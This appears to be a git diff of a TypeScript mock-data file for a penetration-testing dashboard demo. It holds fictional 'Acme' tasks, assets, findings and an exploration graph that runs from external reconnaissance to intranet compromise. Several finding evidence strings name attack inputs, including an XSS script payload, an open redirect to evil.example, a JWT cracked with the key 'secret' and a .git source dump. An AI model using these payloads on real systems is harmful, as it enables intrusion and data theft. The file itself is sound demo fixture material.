@@ -1,7 +1,17 @@
-// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
-// current backend contract in lib/api.ts + lib/types.ts. All data is static and
-// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
-// sessions/activity, traffic, agents, etc.) so every page looks populated.
+// Acme campaign for the hosted preview. Instants are stored against FIXTURE_ANCHOR
+// and moved at load so the newest moment stays 20 minutes ago.
+//
+// Tasks, in order:
+// 1. t-vpn-edge — perimeter review, finished. It found the exposed edge and stopped.
+// 2. t-acme-web — web assessment, running. Started from that edge. This is the active task.
+// 3. t-acme-api — API assessment, running. Spawned from t-acme-web after the order API appeared.
+// 4. t-shop-pay — payment review, paused. Spawned from t-acme-web and t-acme-api. Waiting on an approval.
+//
+// Hosts: acme.com, www.acme.com, admin.acme.com, api.acme.com, shop.acme.com, vpn.acme.com,
+// documentation addresses 203.0.113.10 and 203.0.113.11, and the internal range 10.10.10.0/24.
+//
+// Findings: f-1, f-2, f-3, f-4, f-5, f-6, f-7, f-8, f-9, f-10, f-11, f-12, f-13, f-14, f-15, f-16, f-17.
+// Traffic ids are x-1 through x-19. Do not point a new row at a task, host, or finding that is not listed here.
 
 import type {
   Activity,
@@ -45,7 +55,20 @@ import type {
   TrafficResp,
 } from "@/lib/types";
 
-const T = (iso: string) => iso; // readability helper for timestamps
+const FIXTURE_ANCHOR = Date.parse("2026-10-12T02:23:55Z");
+export const DEMO_NOW = Date.now();
+const DEMO_SHIFT = DEMO_NOW - 20 * 60 * 1000 - FIXTURE_ANCHOR;
+
+export function demoIso(iso: string): string {
+  return new Date(Date.parse(iso) + DEMO_SHIFT).toISOString();
+}
+
+export function demoUnix(seconds: number): number {
+  return seconds + Math.floor(DEMO_SHIFT / 1000);
+}
+
+const T = demoIso;
+const U = demoUnix;
 
 // ── Tasks ──────────────────────────────────────────────────────────────────
 export const ACTIVE_TASK = "t-acme-web";
@@ -59,14 +82,14 @@ export const tasks: Task[] = [
     description: "External assessment of the Acme website and administration portal (acme.com)",
     goal: "Assess administrative access controls and potential exposure of user data.",
     status: "running",
-    created_at: T("2026-07-24T09:12:00Z"),
-    created_unix: 1785489120,
-    last_activity: T("2026-07-26T03:58:22Z"),
-    last_activity_unix: 1785643102,
+    created_at: T("2026-10-06T02:23:55Z"),
+    created_unix: U(1791253435),
+    last_activity: T("2026-10-12T01:53:55Z"),
+    last_activity_unix: U(1791770035),
     paused: false,
     active: true,
     in_flight: 3,
-    findings: { critical: 1, high: 2, medium: 1, low: 0 },
+    findings: { critical: 2, high: 6, medium: 4, low: 1 },
     stalled: false,
     goals_total: 5,
     goals_met: 2,
@@ -86,14 +109,14 @@ export const tasks: Task[] = [
     description: "Authorization and injection assessment for api.acme.com",
     goal: "Assess object-level authorization and injection risks in the order and user APIs.",
     status: "running",
-    created_at: T("2026-07-25T14:05:00Z"),
-    created_unix: 1785592500,
-    last_activity: T("2026-07-26T03:40:10Z"),
-    last_activity_unix: 1785642010,
+    created_at: T("2026-10-10T02:23:55Z"),
+    created_unix: U(1791599035),
+    last_activity: T("2026-10-12T02:13:55Z"),
+    last_activity_unix: U(1791771235),
     paused: false,
     active: false,
     in_flight: 2,
-    findings: { critical: 0, high: 1, medium: 1, low: 0 },
+    findings: { critical: 0, high: 2, medium: 0, low: 1 },
     stalled: false,
     goals_total: 4,
     goals_met: 1,
@@ -113,10 +136,10 @@ export const tasks: Task[] = [
     description: "Payment and order workflows at shop.acme.com",
     goal: "Assess authorization, amount tampering, and race condition risks in payment and order APIs.",
     status: "paused",
-    created_at: T("2026-07-22T08:30:00Z"),
-    created_unix: 1785313800,
-    last_activity: T("2026-07-23T18:40:10Z"),
-    last_activity_unix: 1785436810,
+    created_at: T("2026-09-30T02:23:55Z"),
+    created_unix: U(1790735035),
+    last_activity: T("2026-10-09T02:23:55Z"),
+    last_activity_unix: U(1791512635),
     paused: true,
     active: false,
     in_flight: 0,
@@ -130,6 +153,7 @@ export const tasks: Task[] = [
     llm_failover_state: "ready",
     source_task_ids: ["t-acme-web", "t-acme-api"],
     tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
+    findings: { critical: 0, high: 0, medium: 1, low: 0 },
   },
   {
     id: "t-vpn-edge",
@@ -139,12 +163,12 @@ export const tasks: Task[] = [
     description: "Exposed surface reconnaissance (VPN / border service)",
     goal: "Identify the exploitable edge services exposed by acme.com.",
     status: "done",
-    created_at: T("2026-07-18T08:00:00Z"),
-    created_unix: 1784966400,
-    completed_at: T("2026-07-20T22:11:00Z"),
-    completed_unix: 1785190260,
-    last_activity: T("2026-07-20T22:11:00Z"),
-    last_activity_unix: 1785190260,
+    created_at: T("2026-09-18T02:23:55Z"),
+    created_unix: U(1789698235),
+    completed_at: T("2026-09-21T02:23:55Z"),
+    completed_unix: U(1789957435),
+    last_activity: T("2026-09-21T02:23:55Z"),
+    last_activity_unix: U(1789957435),
     paused: false,
     active: false,
     in_flight: 0,
@@ -158,6 +182,7 @@ export const tasks: Task[] = [
     llm_failover_state: "ready",
     source_task_ids: [],
     tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
+    findings: { critical: 0, high: 0, medium: 0, low: 0 },
   },
 ];
 
@@ -166,15 +191,15 @@ export const taskCategories: TaskCategory[] = [
     id: 1,
     name: "External assessment",
     task_count: 2,
-    created_at: T("2026-07-18T08:00:00Z"),
-    updated_at: T("2026-07-25T08:00:00Z"),
+    created_at: T("2026-09-18T08:23:55Z"),
+    updated_at: T("2026-09-29T16:30:55Z"),
   },
   {
     id: 2,
     name: "API assessment",
     task_count: 2,
-    created_at: T("2026-07-19T08:00:00Z"),
-    updated_at: T("2026-07-24T08:00:00Z"),
+    created_at: T("2026-09-19T02:23:55Z"),
+    updated_at: T("2026-09-29T05:04:49Z"),
   },
 ];
 
@@ -184,16 +209,16 @@ export const taskTemplates: TaskTemplate[] = [
     name: "External Web Penetration",
     description: "Assess exposed websites, APIs, and administrative entry points in the simulated environment.",
     goal: "Identify and verify security issues that could lead to unauthorized access, exposure of sensitive data, or server compromise.",
-    created_at: T("2026-07-20T08:00:00Z"),
-    updated_at: T("2026-07-25T08:00:00Z"),
+    created_at: T("2026-09-19T20:23:55Z"),
+    updated_at: T("2026-09-29T16:30:55Z"),
   },
   {
     id: 2,
     name: "API authorization assessment",
     description: "Conduct dedicated testing around authentication, object-level authorization, and role boundaries for the target API.",
     goal: "Assess object-level and role-based authorization, including bulk data access.",
-    created_at: T("2026-07-19T08:00:00Z"),
-    updated_at: T("2026-07-24T08:00:00Z"),
+    created_at: T("2026-09-19T02:23:55Z"),
+    updated_at: T("2026-09-29T05:04:49Z"),
   },
 ];
 
@@ -264,10 +289,10 @@ export const assets: Asset[] = [
     task_ids: [1],
     domain: "acme.com",
     root_domain: "acme.com",
-    icp: "Beijing ICP No. 2021xxxx",
+    icp: "",
     record_type: "A",
     record_value: ["203.0.113.10"],
-    last_seen: T("2026-07-26T02:00:00Z"),
+    last_seen: T("2026-09-30T01:05:30Z"),
   },
   {
     id: 2,
@@ -278,7 +303,7 @@ export const assets: Asset[] = [
     root_domain: "acme.com",
     record_type: "CNAME",
     record_value: "acme.com",
-    last_seen: T("2026-07-26T02:01:00Z"),
+    last_seen: T("2026-09-30T01:05:58Z"),
   },
   {
     id: 3,
@@ -289,7 +314,7 @@ export const assets: Asset[] = [
     root_domain: "acme.com",
     record_type: "A",
     record_value: ["203.0.113.11"],
-    last_seen: T("2026-07-26T02:02:00Z"),
+    last_seen: T("2026-09-30T01:06:27Z"),
   },
   {
     id: 4,
@@ -300,7 +325,7 @@ export const assets: Asset[] = [
     root_domain: "acme.com",
     record_type: "A",
     record_value: ["203.0.113.12"],
-    last_seen: T("2026-07-26T02:03:00Z"),
+    last_seen: T("2026-09-30T01:06:56Z"),
   },
   {
     id: 5,
@@ -311,7 +336,7 @@ export const assets: Asset[] = [
     root_domain: "acme.com",
     record_type: "A",
     record_value: ["198.51.100.20"],
-    last_seen: T("2026-07-20T02:00:00Z"),
+    last_seen: T("2026-09-19T15:53:55Z"),
   },
   {
     id: 6,
@@ -322,7 +347,7 @@ export const assets: Asset[] = [
     root_domain: "acme.com",
     record_type: "A",
     record_value: ["203.0.113.10"],
-    last_seen: T("2026-07-26T02:04:00Z"),
+    last_seen: T("2026-09-30T01:07:24Z"),
   },
   {
     id: 7,
@@ -336,7 +361,7 @@ export const assets: Asset[] = [
       { port: 443, service: "https" },
       { port: 22, service: "ssh" },
     ],
-    last_seen: T("2026-07-26T02:05:00Z"),
+    last_seen: T("2026-09-30T01:07:53Z"),
   },
   {
     id: 8,
@@ -346,7 +371,7 @@ export const assets: Asset[] = [
     ip: "203.0.113.11",
     c_segment: "203.0.113.0",
     open_ports: [{ port: 443, service: "https" }],
-    last_seen: T("2026-07-26T02:06:00Z"),
+    last_seen: T("2026-09-30T01:08:21Z"),
   },
   {
     id: 9,
@@ -359,7 +384,7 @@ export const assets: Asset[] = [
       { port: 443, service: "https" },
       { port: 500, service: " isakmp" },
     ],
-    last_seen: T("2026-07-20T02:00:00Z"),
+    last_seen: T("2026-09-19T15:53:55Z"),
   },
   {
     id: 10,
@@ -370,7 +395,7 @@ export const assets: Asset[] = [
     port: 443,
     service_type: "https",
     service_name: "nginx/1.24.0",
-    last_seen: T("2026-07-26T02:07:00Z"),
+    last_seen: T("2026-09-30T01:08:50Z"),
   },
   {
     id: 11,
@@ -381,7 +406,7 @@ export const assets: Asset[] = [
     port: 22,
     service_type: "ssh",
     service_name: "OpenSSH 8.9p1",
-    last_seen: T("2026-07-20T02:00:00Z"),
+    last_seen: T("2026-09-19T15:53:55Z"),
   },
   {
     id: 12,
@@ -396,7 +421,7 @@ export const assets: Asset[] = [
     page_title: "Acme Corp Official corporate website",
     technologies: ["Nginx", "React", "Cloudflare"],
     favicon_mmh3: "-1580860059",
-    last_seen: T("2026-07-26T02:08:00Z"),
+    last_seen: T("2026-09-30T01:09:18Z"),
   },
   {
     id: 13,
@@ -410,7 +435,7 @@ export const assets: Asset[] = [
     content_length: 12044,
     page_title: "Acme Admin Login",
     technologies: ["Nginx", "Vue", "Element-UI"],
-    last_seen: T("2026-07-26T02:09:00Z"),
+    last_seen: T("2026-09-30T01:09:47Z"),
   },
   {
     id: 14,
@@ -424,7 +449,7 @@ export const assets: Asset[] = [
     content_length: 45,
     page_title: "",
     technologies: ["Kong", "Node.js"],
-    last_seen: T("2026-07-26T02:10:00Z"),
+    last_seen: T("2026-09-30T01:10:16Z"),
   },
   {
     id: 15,
@@ -438,7 +463,7 @@ export const assets: Asset[] = [
       { name: "id", in: "query" },
       { name: "page", in: "query" },
     ],
-    last_seen: T("2026-07-26T02:11:00Z"),
+    last_seen: T("2026-09-30T01:10:44Z"),
   },
   {
     id: 16,
@@ -448,7 +473,7 @@ export const assets: Asset[] = [
     url: "https://api.acme.com/v1/users/me",
     method: "GET",
     status_code: 200,
-    last_seen: T("2026-07-26T02:12:00Z"),
+    last_seen: T("2026-09-30T01:11:13Z"),
   },
   {
     id: 17,
@@ -459,7 +484,7 @@ export const assets: Asset[] = [
     method: "POST",
     status_code: 200,
     params: [{ name: "username" }, { name: "password" }],
-    last_seen: T("2026-07-26T02:13:00Z"),
+    last_seen: T("2026-09-30T01:11:41Z"),
   },
   {
     id: 18,
@@ -470,7 +495,7 @@ export const assets: Asset[] = [
     method: "GET",
     status_code: 200,
     params: [{ name: "q", in: "query" }],
-    last_seen: T("2026-07-26T02:14:00Z"),
+    last_seen: T("2026-09-30T01:12:10Z"),
   },
   // Intranet assets(DMZ→Intranet horizontal discovery)
   {
@@ -484,7 +509,7 @@ export const assets: Asset[] = [
       { port: 80, service: "http" },
       { port: 22, service: "ssh" },
     ],
-    last_seen: T("2026-07-25T15:40:00Z"),
+    last_seen: T("2026-09-29T20:10:05Z"),
   },
   {
     id: 20,
@@ -498,7 +523,7 @@ export const assets: Asset[] = [
       { port: 389, service: "ldap" },
       { port: 445, service: "smb" },
     ],
-    last_seen: T("2026-07-25T21:00:00Z"),
+    last_seen: T("2026-09-29T22:42:34Z"),
   },
   {
     id: 21,
@@ -508,7 +533,7 @@ export const assets: Asset[] = [
     ip: "10.10.10.5",
     c_segment: "10.10.10.0",
     open_ports: [{ port: 445, service: "smb" }],
-    last_seen: T("2026-07-25T21:00:00Z"),
+    last_seen: T("2026-09-29T22:42:34Z"),
   },
   {
     id: 22,
@@ -518,7 +543,7 @@ export const assets: Asset[] = [
     ip: "10.10.10.20",
     c_segment: "10.10.10.0",
     open_ports: [{ port: 8080, service: "http-proxy" }],
-    last_seen: T("2026-07-25T21:00:00Z"),
+    last_seen: T("2026-09-29T22:42:34Z"),
   },
   {
     id: 23,
@@ -529,7 +554,7 @@ export const assets: Asset[] = [
     port: 8080,
     service_type: "http",
     service_name: "Jenkins 2.289",
-    last_seen: T("2026-07-25T21:35:00Z"),
+    last_seen: T("2026-09-29T22:59:14Z"),
   },
   {
     id: 24,
@@ -540,7 +565,7 @@ export const assets: Asset[] = [
     port: 445,
     service_type: "smb",
     service_name: "Windows Server 2019 DC",
-    last_seen: T("2026-07-25T23:55:00Z"),
+    last_seen: T("2026-09-30T00:05:56Z"),
   },
   {
     id: 25,
@@ -554,7 +579,7 @@ export const assets: Asset[] = [
     content_length: 14200,
     page_title: "Jenkins Dashboard",
     technologies: ["Jenkins", "Java"],
-    last_seen: T("2026-07-25T21:35:00Z"),
+    last_seen: T("2026-09-29T22:59:14Z"),
   },
   {
     id: 26,
@@ -564,7 +589,7 @@ export const assets: Asset[] = [
     url: "http://10.10.10.20:8080/script",
     method: "GET",
     status_code: 200,
-    last_seen: T("2026-07-25T21:35:00Z"),
+    last_seen: T("2026-09-29T22:59:14Z"),
   },
 ];
 
@@ -602,7 +627,7 @@ export const findings: Finding[] = [
     intent_id: "i-2",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-26T01:20:00Z"),
+    ts: T("2026-09-30T00:46:26Z"),
   },
   {
     id: "f-2",
@@ -615,7 +640,7 @@ export const findings: Finding[] = [
     intent_id: "i-5",
     task_id: "t-acme-api",
     task_description: "Authorization and injection assessment for api.acme.com",
-    ts: T("2026-07-26T02:44:00Z"),
+    ts: T("2026-09-30T01:26:28Z"),
   },
   {
     id: "f-3",
@@ -627,7 +652,7 @@ export const findings: Finding[] = [
     evidence: "HS256, key 'secret', john 5 seconds to crack → can forge any sub to exceed authority.",
     task_id: "t-acme-api",
     task_description: "Authorization and injection assessment for api.acme.com",
-    ts: T("2026-07-26T03:02:00Z"),
+    ts: T("2026-09-30T01:35:02Z"),
   },
   {
     id: "f-4",
@@ -639,7 +664,7 @@ export const findings: Finding[] = [
     evidence: "q=<script>alert(document.domain)</script> is echoed unchanged in the result title.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T22:10:00Z"),
+    ts: T("2026-09-29T23:15:55Z"),
   },
   {
     id: "f-5",
@@ -651,7 +676,7 @@ export const findings: Finding[] = [
     evidence: "GET /.git/HEAD → 200; git-dumper restores the backend source code and database connection string comments.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T20:30:00Z"),
+    ts: T("2026-09-29T22:28:16Z"),
   },
   {
     id: "f-6",
@@ -664,7 +689,7 @@ export const findings: Finding[] = [
     intent_id: "i-3",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-26T03:50:00Z"),
+    ts: T("2026-09-30T01:57:54Z"),
   },
   {
     id: "f-7",
@@ -676,7 +701,7 @@ export const findings: Finding[] = [
     evidence: "/login?next=https://evil.example After logging in, 302 jumps to the external site.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T19:12:00Z"),
+    ts: T("2026-09-29T21:51:06Z"),
   },
   {
     id: "f-8",
@@ -688,7 +713,7 @@ export const findings: Finding[] = [
     evidence: "1000 times/minute, no lock, no verification code.",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T18:40:00Z"),
+    ts: T("2026-09-29T21:35:51Z"),
   },
   {
     id: "f-9",
@@ -700,7 +725,7 @@ export const findings: Finding[] = [
     evidence: "Trigger 500 returns the Node.js stack, leaking absolute paths and dependency versions.",
     task_id: "t-acme-api",
     task_description: "Authorization and injection assessment for api.acme.com",
-    ts: T("2026-07-25T23:05:00Z"),
+    ts: T("2026-09-29T23:42:07Z"),
   },
   {
     id: "f-10",
@@ -712,7 +737,7 @@ export const findings: Finding[] = [
     evidence: "Fingerprinted to component v2.3.1, corresponding to CVE-2024-xxxx deserialization RCE.",
     task_id: "t-shop-pay",
     task_description: "Payment and order workflows at shop.acme.com",
-    ts: T("2026-07-23T15:00:00Z"),
+    ts: T("2026-09-28T20:58:50Z"),
   },
   // ── External network→High-risk discovery on deep intranet links(active task)──
   {
@@ -725,7 +750,7 @@ export const findings: Finding[] = [
     intent_id: "ig",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T20:36:00Z"),
+    ts: T("2026-09-29T22:31:07Z"),
   },
   {
     id: "f-12",
@@ -742,7 +767,7 @@ export const findings: Finding[] = [
     intent_id: "i7",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T15:40:00Z"),
+    ts: T("2026-09-29T20:10:05Z"),
   },
   {
     id: "f-13",
@@ -756,7 +781,7 @@ export const findings: Finding[] = [
     intent_id: "i8",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T16:20:00Z"),
+    ts: T("2026-09-29T20:29:09Z"),
   },
   {
     id: "f-14",
@@ -769,7 +794,7 @@ export const findings: Finding[] = [
     intent_id: "i9",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T21:00:00Z"),
+    ts: T("2026-09-29T22:42:34Z"),
   },
   {
     id: "f-15",
@@ -783,7 +808,7 @@ export const findings: Finding[] = [
     intent_id: "i11",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T21:50:00Z"),
+    ts: T("2026-09-29T23:06:23Z"),
   },
   {
     id: "f-16",
@@ -796,7 +821,7 @@ export const findings: Finding[] = [
     intent_id: "i12",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-25T23:20:00Z"),
+    ts: T("2026-09-29T23:49:16Z"),
   },
   {
     id: "f-17",
@@ -813,7 +838,7 @@ export const findings: Finding[] = [
     intent_id: "i13",
     task_id: "t-acme-web",
     task_description: "External assessment of the Acme website and administration portal",
-    ts: T("2026-07-26T00:20:00Z"),
+    ts: T("2026-09-30T00:17:51Z"),
   },
 ];
 
@@ -832,7 +857,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "origin",
       origin: "system",
-      ts: T("2026-07-24T09:12:00Z"),
+      ts: T("2026-09-29T05:39:07Z"),
     },
 
     // ── Target (by goals agent Dismantle, and gradually increase the target to the intranet as the discovery is made)──
@@ -843,7 +868,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 9,
       state: "met",
       origin: "goals",
-      ts: T("2026-07-24T09:13:00Z"),
+      ts: T("2026-09-29T05:39:36Z"),
     },
     {
       id: "g2",
@@ -852,7 +877,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "open",
       origin: "goals",
-      ts: T("2026-07-24T09:13:00Z"),
+      ts: T("2026-09-29T05:39:36Z"),
     },
     {
       id: "g3",
@@ -861,7 +886,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 9,
       state: "met",
       origin: "goals",
-      ts: T("2026-07-25T14:10:00Z"),
+      ts: T("2026-09-29T19:27:13Z"),
     },
     {
       id: "g4",
@@ -870,7 +895,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 10,
       state: "met",
       origin: "goals",
-      ts: T("2026-07-25T20:00:00Z"),
+      ts: T("2026-09-29T22:13:58Z"),
     },
 
     // ── No. 1 Layer · External network reconnaissance / External vulnerabilities ──
@@ -881,7 +906,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 6,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-24T09:20:00Z"),
+      ts: T("2026-09-29T05:42:56Z"),
     },
     {
       id: "i2",
@@ -890,7 +915,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 9,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-26T03:30:00Z"),
+      ts: T("2026-09-30T01:48:23Z"),
     },
     {
       id: "i3",
@@ -899,7 +924,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "running",
       origin: "planner",
-      ts: T("2026-07-26T03:55:00Z"),
+      ts: T("2026-09-30T02:00:17Z"),
     },
     {
       id: "i4",
@@ -908,7 +933,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T22:00:00Z"),
+      ts: T("2026-09-29T23:11:09Z"),
     },
     {
       id: "i5",
@@ -917,7 +942,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "running",
       origin: "planner",
-      ts: T("2026-07-26T02:30:00Z"),
+      ts: T("2026-09-30T01:19:47Z"),
     },
     {
       id: "ig",
@@ -926,7 +951,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 7,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T20:20:00Z"),
+      ts: T("2026-09-29T22:23:30Z"),
     },
 
     // ── No. 2 Layer · Breakthrough DMZ Establish a foothold ──
@@ -937,7 +962,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 7,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T14:20:00Z"),
+      ts: T("2026-09-29T19:31:58Z"),
     },
     {
       id: "i7",
@@ -946,7 +971,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 9,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T15:10:00Z"),
+      ts: T("2026-09-29T19:55:48Z"),
     },
     {
       id: "i8",
@@ -955,7 +980,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T16:00:00Z"),
+      ts: T("2026-09-29T20:19:37Z"),
     },
 
     // ── No. 3 Layer · Intranet horizontal and vertical (multi-layer test)──
@@ -966,7 +991,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T20:30:00Z"),
+      ts: T("2026-09-29T22:28:16Z"),
     },
     {
       id: "i10",
@@ -975,7 +1000,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "running",
       origin: "planner",
-      ts: T("2026-07-26T03:40:00Z"),
+      ts: T("2026-09-30T01:53:09Z"),
     },
     {
       id: "i11",
@@ -984,7 +1009,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 9,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T21:30:00Z"),
+      ts: T("2026-09-29T22:56:51Z"),
     },
     {
       id: "i12",
@@ -993,7 +1018,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 8,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T22:40:00Z"),
+      ts: T("2026-09-29T23:30:12Z"),
     },
     {
       id: "i13",
@@ -1002,7 +1027,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 10,
       state: "done",
       origin: "planner",
-      ts: T("2026-07-25T23:50:00Z"),
+      ts: T("2026-09-30T00:03:33Z"),
     },
 
     // ── fact ──
@@ -1013,7 +1038,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#1",
-      ts: T("2026-07-24T09:40:00Z"),
+      ts: T("2026-09-29T05:52:28Z"),
     },
     {
       id: "fa2",
@@ -1022,7 +1047,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#4",
-      ts: T("2026-07-25T22:05:00Z"),
+      ts: T("2026-09-29T23:13:32Z"),
     },
     {
       id: "faGit",
@@ -1031,7 +1056,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "workG",
-      ts: T("2026-07-25T20:30:00Z"),
+      ts: T("2026-09-29T22:28:16Z"),
     },
     {
       id: "faCreds",
@@ -1040,7 +1065,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "workG",
-      ts: T("2026-07-25T20:35:00Z"),
+      ts: T("2026-09-29T22:30:39Z"),
     },
     {
       id: "fa3",
@@ -1049,7 +1074,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#6",
-      ts: T("2026-07-25T14:40:00Z"),
+      ts: T("2026-09-29T19:41:30Z"),
     },
     {
       id: "fa4",
@@ -1058,7 +1083,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#7",
-      ts: T("2026-07-25T15:40:00Z"),
+      ts: T("2026-09-29T20:10:05Z"),
     },
     {
       id: "fa5",
@@ -1067,7 +1092,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#8",
-      ts: T("2026-07-25T16:20:00Z"),
+      ts: T("2026-09-29T20:29:09Z"),
     },
     {
       id: "fa6",
@@ -1076,7 +1101,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#9",
-      ts: T("2026-07-25T20:40:00Z"),
+      ts: T("2026-09-29T22:33:02Z"),
     },
     {
       id: "fa7",
@@ -1085,7 +1110,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#9",
-      ts: T("2026-07-25T21:00:00Z"),
+      ts: T("2026-09-29T22:42:34Z"),
     },
     {
       id: "fa8",
@@ -1094,7 +1119,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#11",
-      ts: T("2026-07-25T21:45:00Z"),
+      ts: T("2026-09-29T23:04:00Z"),
     },
     {
       id: "fa9",
@@ -1103,7 +1128,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#11",
-      ts: T("2026-07-25T22:10:00Z"),
+      ts: T("2026-09-29T23:15:55Z"),
     },
     {
       id: "fa10",
@@ -1112,7 +1137,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "open",
       origin: "work#12",
-      ts: T("2026-07-25T23:20:00Z"),
+      ts: T("2026-09-29T23:49:16Z"),
     },
 
     // ── Vulnerability ──
@@ -1123,7 +1148,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#2",
-      ts: T("2026-07-26T03:50:00Z"),
+      ts: T("2026-09-30T01:57:54Z"),
     },
     {
       id: "fi2",
@@ -1132,7 +1157,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#4",
-      ts: T("2026-07-26T01:20:00Z"),
+      ts: T("2026-09-30T00:46:26Z"),
     },
     {
       id: "fi3",
@@ -1141,7 +1166,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#5",
-      ts: T("2026-07-26T02:44:00Z"),
+      ts: T("2026-09-30T01:26:28Z"),
     },
     {
       id: "fiSrc",
@@ -1150,7 +1175,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "workG",
-      ts: T("2026-07-25T20:36:00Z"),
+      ts: T("2026-09-29T22:31:07Z"),
     },
     {
       id: "fiRce",
@@ -1159,7 +1184,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#7",
-      ts: T("2026-07-25T15:40:00Z"),
+      ts: T("2026-09-29T20:10:05Z"),
     },
     {
       id: "fiPriv",
@@ -1168,7 +1193,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#8",
-      ts: T("2026-07-25T16:20:00Z"),
+      ts: T("2026-09-29T20:29:09Z"),
     },
     {
       id: "fiJenkins",
@@ -1177,7 +1202,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#11",
-      ts: T("2026-07-25T21:50:00Z"),
+      ts: T("2026-09-29T23:06:23Z"),
     },
     {
       id: "fiKerb",
